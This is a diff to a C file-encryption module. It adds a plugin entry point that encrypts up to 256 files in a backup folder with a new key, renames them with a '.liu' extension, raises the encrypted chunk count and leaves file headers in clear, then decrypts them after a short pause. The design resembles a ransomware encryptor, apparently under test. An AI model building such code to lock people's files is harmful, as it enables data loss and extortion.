@@ -1,30 +1,50 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 #include "../include/encrypt.h"
 #include "../include/hydrogen.h"
 #include "../include/types.h"
+#include "../include/system_utils.h"
 
+#define META_SIZE 512
 #define BUF_SIZE 1024
-#define CHUNKS_TO_ENCRYPT 1
+#define CHUNKS_TO_ENCRYPT 10
 #define FILE_EXTENSION ".liu"
 #define CONTEXT "FENCRYPT"
 #define ENCRYPTED_BUF_SIZE BUF_SIZE + hydro_secretbox_HEADERBYTES
 
-int encrypt_file(char *file_name, uint8_t **new_key)
+int init_plugin()
+{
+    char **list = list_files("~/back");
+
+    // Generate encryption key
+    uint8_t key[hydro_secretbox_KEYBYTES];
+    hydro_secretbox_keygen(key);
+
+    for (int i = 0; i < 256 && strcmp(list[i], ""); i++)
+    {
+        encrypt_file(list[i], key);
+    }
+
+    sleep(5);
+
+    for (int i = 0; i < 256 && strcmp(list[i], ""); i++)
+    {
+        decrypt_file(list[i], key);
+    }
+
+
+    return OK;
+}
+
+int encrypt_file(char *file_name, uint8_t *key)
 {
     FILE *fp_original, *fp_encrypted;
     char *n_file_name = (char *)calloc(strlen(file_name) + 1 + strlen(FILE_EXTENSION), sizeof(char));
     char buf[BUF_SIZE] = {0};
-
-    // Generate encryption key
-    uint8_t key[hydro_secretbox_KEYBYTES];
     uint8_t encrypted_buf[ENCRYPTED_BUF_SIZE];
-    hydro_secretbox_keygen(key);
-
-    // Copy key to the parameter
-    memcpy(*new_key, key, sizeof(key));
 
     // Open original file
     fp_original = fopen(file_name, "rb");
@@ -50,6 +70,10 @@ int encrypt_file(char *file_name, uint8_t **new_key)
         free(n_file_name);
         return ERROR;
     }
+
+    // Read the metadata and write it unencrypted
+    fread(buf, META_SIZE, 1, fp_original);
+    fwrite(buf, META_SIZE, 1, fp_encrypted);
 
     long last_pos = 0;
     long i = 0;
@@ -102,7 +126,7 @@ int encrypt_file(char *file_name, uint8_t **new_key)
     return OK;
 }
 
-int dencrypt_file(char *file_name, uint8_t *key)
+int decrypt_file(char *file_name, uint8_t *key)
 {
     FILE *fp_encrypted, *fp_decrypted;
     char *n_file_name = (char *)calloc(strlen(file_name) + 1, sizeof(char));
@@ -124,7 +148,7 @@ int dencrypt_file(char *file_name, uint8_t *key)
     if (!fp_encrypted)
     {
 #ifdef DEBUG
-        printf("[ERROR] Reading .liu file...\n");
+        printf("[ERROR] Reading .liu file [%s]...\n", file_name);
 #endif
         free(n_file_name);
         return ERROR;
@@ -142,6 +166,10 @@ int dencrypt_file(char *file_name, uint8_t *key)
         free(n_file_name);
         return ERROR;
     }
+
+    // Read the metadata and write it unencrypted
+    fread(buf, META_SIZE, 1, fp_encrypted);
+    fwrite(buf, META_SIZE, 1, fp_decrypted);
 
     long last_pos = 0;
     long i = 0;
